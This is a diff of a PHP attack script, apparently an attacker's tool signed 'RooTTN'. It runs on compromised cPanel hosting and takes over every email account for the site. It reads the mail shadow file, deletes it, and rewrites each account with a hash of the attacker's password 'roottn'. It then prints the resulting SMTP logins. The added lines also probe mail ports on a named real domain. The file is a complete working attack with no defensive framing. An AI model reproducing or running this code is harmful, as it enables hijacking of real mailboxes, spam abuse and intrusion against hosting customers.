@@ -1,16 +1,42 @@
 <?php
+//Bksmile *(RooTTN)*
 set_time_limit(0);
+ini_set('max_execution_time', 0);
+ini_set('memory_limit', -1);
+$ports = array(25, 587, 465, 110, 995, 143 , 993);
+$host = "rentatuauto.com.mx";
+//curent user
+$user=get_current_user();
+// Smtp password
+$password='roottn';
+//crypt
+$pwd = crypt($password,'$6$roottn$');
+// host name
  $t = $_SERVER['SERVER_NAME'];
+//edit
  $t = @str_replace("www.","",$t);
-@$passwd = file_get_contents('/home/'.get_current_user().'/etc/'.$t.'/shadow');
+ //get users
+@$passwd = file_get_contents('/home/'.$user.'/etc/'.$t.'/shadow');
+//edit
 $ex=explode("\r\n",$passwd);
-@unlink('/home/'.get_current_user().'/etc/'.$t.'/shadow');
+//backup shadow
+@link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.roottn.bak');
+//delete shadow
+@unlink('/home/'.$user.'/etc/'.$t.'/shadow');
 foreach($ex as $ex){
 $ex=explode(':',$ex);
 $e= $ex[0];
 if ($e){
-$b=fopen('/home/'.get_current_user().'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':$6$roottn$sMVQO5HQfxAqtdarLWPdj092B.1km9RMKFGhLxfTL/gB0wehJllwpoTEbiVY3qGL5fkZp38DwscszpwOjKriX0:16249:::::'."\r\n");fclose($b);
-echo '<span style=\'color:#00ff00;\'>'.$t.'|25|'.$e.'@'.$t.'|vodka</span><br>';  "</center>";
+$b=fopen('/home/'.$user.'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
+echo '<span style=\'color:#00ff00;\'>'.$t.'|25|'.$e.'@'.$t.'|'.$password.'</span><br>';  "</center>";
 }}
-
+foreach ($ports as $port)
+{
+    $connection = @fsockopen($host, $port, $errno, $errstr, 2);
+    if (is_resource($connection))
+    {
+        echo '<h2>' . $host . ':' . $port . ' ' . '(' . getservbyport($port, 'tcp') . ') is open.</h2>' . "\n";
+        fclose($connection);
+    }
+}
 ?>
